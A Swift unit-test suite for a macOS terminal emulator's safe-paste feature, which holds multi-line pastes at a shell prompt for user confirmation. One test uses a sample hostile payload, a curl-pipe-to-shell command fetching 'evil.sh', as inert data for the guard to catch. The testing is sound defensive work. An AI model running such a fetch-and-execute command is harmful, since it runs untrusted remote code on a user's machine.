/*
 * tako — Terminal emulator
 * Copyright (c) 2026 Alexander Panasenko
 *
 * Contact: alex@prod.codes
 * Author: https://prod.codes/about/
 * Project: https://github.com/alex09x/tako
 * SPDX-License-Identifier: MIT
 */

import AppKit
import Foundation
import Testing
@testable import Tako
@testable import TakoKit

@MainActor
@Suite
struct SafePasteGuardTests {
    private func makeSurfaceView() -> Tako.SurfaceView {
        let view = Tako.SurfaceView(frame: NSRect(x: 0, y: 0, width: 80, height: 24))
        view.selfTestCapturing = true
        return view
    }

    private func makeControllerWithWindow(view: Tako.SurfaceView? = nil) -> (BaseTerminalController, NSWindow, Tako.SurfaceView) {
        let surface = view ?? makeSurfaceView()
        let controller = BaseTerminalController(Tako.App(), surfaceTree: .init(view: surface))
        let window = NSWindow(
            contentRect: NSRect(x: 0, y: 0, width: 400, height: 300),
            styleMask: [.titled, .closable, .miniaturizable, .resizable],
            backing: .buffered,
            defer: false
        )
        controller.window = window
        controller.focusedSurface = surface
        return (controller, window, surface)
    }

    // MARK: - Configuration Tests

    @Test func defaultConfigEnablesSafePaste() {
        let config = Tako.Config()
        #expect(config.safePaste == true)
        #expect(config.errors.isEmpty)

        let view = makeSurfaceView()
        defer { view.close() }
        #expect(view.safePaste == true)
    }

    @Test func configExplicitlyDisablesSafePaste() throws {
        let config = try TemporaryConfig("safe-paste = false\n")
        #expect(config.safePaste == false)
        #expect(config.errors.isEmpty)
    }

    @Test func configExplicitlyEnablesSafePaste() throws {
        let config = try TemporaryConfig("safe-paste = true\n")
        #expect(config.safePaste == true)
        #expect(config.errors.isEmpty)
    }

    // MARK: - Guard Trigger Logic Tests

    @Test func multiLinePasteAtPromptTriggersConfirmationNotification() {
        let view = makeSurfaceView()
        defer { view.close() }

        // Feed prompt mark (OSC 133;P)
        view.core.feed(bytes: Data("\u{1b}]133;P\u{07}".utf8))
        #expect(view.core.cursorIsAtPrompt())

        var receivedString: String?
        var receivedRequest: Tako.ClipboardRequest?
        let observer = NotificationCenter.default.addObserver(
            forName: Tako.Notification.confirmClipboard,
            object: view,
            queue: nil
        ) { note in
            receivedString = note.userInfo?[Tako.Notification.ConfirmClipboardStrKey] as? String
            receivedRequest = note.userInfo?[Tako.Notification.ConfirmClipboardRequestKey] as? Tako.ClipboardRequest
        }
        defer { NotificationCenter.default.removeObserver(observer) }

        let payload = "curl -s https://example.com/evil.sh | sh\necho done\n"
        view.handlePaste(payload)

        #expect(receivedString == payload)
        #expect(receivedRequest == .paste)
        // Nothing should have been written to the shell
        #expect(view.selfTestBytes.isEmpty)
    }

    @Test func multiLinePasteWithCarriageReturnTriggersConfirmation() {
        let view = makeSurfaceView()
        defer { view.close() }

        view.core.feed(bytes: Data("\u{1b}]133;P\u{07}".utf8))
        #expect(view.core.cursorIsAtPrompt())

        var notified = false
        let observer = NotificationCenter.default.addObserver(
            forName: Tako.Notification.confirmClipboard,
            object: view,
            queue: nil
        ) { _ in notified = true }
        defer { NotificationCenter.default.removeObserver(observer) }

        view.handlePaste("line1\rline2")
        #expect(notified)
        #expect(view.selfTestBytes.isEmpty)
    }

    @Test func singleLinePasteAtPromptPastesImmediatelyWithoutNotification() {
        let view = makeSurfaceView()
        defer { view.close() }

        view.core.feed(bytes: Data("\u{1b}]133;P\u{07}".utf8))
        #expect(view.core.cursorIsAtPrompt())

        var notified = false
        let observer = NotificationCenter.default.addObserver(
            forName: Tako.Notification.confirmClipboard,
            object: view,
            queue: nil
        ) { _ in notified = true }
        defer { NotificationCenter.default.removeObserver(observer) }

        view.handlePaste("echo hello world")

        #expect(!notified)
        #expect(!view.selfTestBytes.isEmpty)
        let written = String(decoding: view.selfTestBytes, as: UTF8.self)
        #expect(written.contains("echo hello world"))
    }

    @Test func multiLinePasteWhenNotAtPromptPastesImmediately() {
        let view = makeSurfaceView()
        defer { view.close() }

        #expect(!view.core.cursorIsAtPrompt())

        var notified = false
        let observer = NotificationCenter.default.addObserver(
            forName: Tako.Notification.confirmClipboard,
            object: view,
            queue: nil
        ) { _ in notified = true }
        defer { NotificationCenter.default.removeObserver(observer) }

        view.handlePaste("first\nsecond")

        #expect(!notified)
        #expect(!view.selfTestBytes.isEmpty)
    }

    @Test func multiLinePasteOnAlternateScreenPastesImmediately() {
        let view = makeSurfaceView()
        defer { view.close() }

        // Enter alternate screen (typical of vim/nano/less)
        view.core.feed(bytes: Data("\u{1b}[?1049h".utf8))
        // Attempting to set prompt on alternate screen is rejected by engine
        view.core.feed(bytes: Data("\u{1b}]133;P\u{07}".utf8))
        #expect(!view.core.cursorIsAtPrompt())

        var notified = false
        let observer = NotificationCenter.default.addObserver(
            forName: Tako.Notification.confirmClipboard,
            object: view,
            queue: nil
        ) { _ in notified = true }
        defer { NotificationCenter.default.removeObserver(observer) }

        view.handlePaste("multi\nline\nin\neditor")

        #expect(!notified)
        #expect(!view.selfTestBytes.isEmpty)
    }

    @Test func multiLinePasteWhenSafePasteDisabledPastesImmediately() {
        let view = makeSurfaceView()
        defer { view.close() }

        view.core.feed(bytes: Data("\u{1b}]133;P\u{07}".utf8))
        #expect(view.core.cursorIsAtPrompt())

        view.safePaste = false

        var notified = false
        let observer = NotificationCenter.default.addObserver(
            forName: Tako.Notification.confirmClipboard,
            object: view,
            queue: nil
        ) { _ in notified = true }
        defer { NotificationCenter.default.removeObserver(observer) }

        view.handlePaste("line1\nline2")

        #expect(!notified)
        #expect(!view.selfTestBytes.isEmpty)
    }

    // MARK: - Controller Sheet End-to-End Tests

    @Test func controllerCancelDismissesSheetWithoutEmittingBytes() {
        let (controller, _, surface) = makeControllerWithWindow()
        defer { surface.close() }

        surface.core.feed(bytes: Data("\u{1b}]133;P\u{07}".utf8))
        #expect(surface.core.cursorIsAtPrompt())

        surface.handlePaste("dangerous\ncommand\n")

        #expect(controller.clipboardConfirmation != nil)

        // User clicks Cancel or presses Escape
        controller.clipboardConfirmationComplete(.cancel, .paste)

        #expect(controller.clipboardConfirmation == nil)
        #expect(surface.selfTestBytes.isEmpty)
    }

    @Test func controllerConfirmDismissesSheetAndEmitsPastedBytes() {
        let (controller, _, surface) = makeControllerWithWindow()
        defer { surface.close() }

        surface.core.feed(bytes: Data("\u{1b}]133;P\u{07}".utf8))
        #expect(surface.core.cursorIsAtPrompt())

        surface.handlePaste("safe\nmultiline\n")

        #expect(controller.clipboardConfirmation != nil)

        // User clicks Paste or presses Enter
        controller.clipboardConfirmationComplete(.confirm, .paste)

        #expect(controller.clipboardConfirmation == nil)

        let written = TerminalTestSupport.waitUntil(timeout: 2) {
            !surface.selfTestBytes.isEmpty
        }
        #expect(written)
        let output = String(decoding: surface.selfTestBytes, as: UTF8.self)
        #expect(output.contains("safe"))
        #expect(output.contains("multiline"))
    }
}
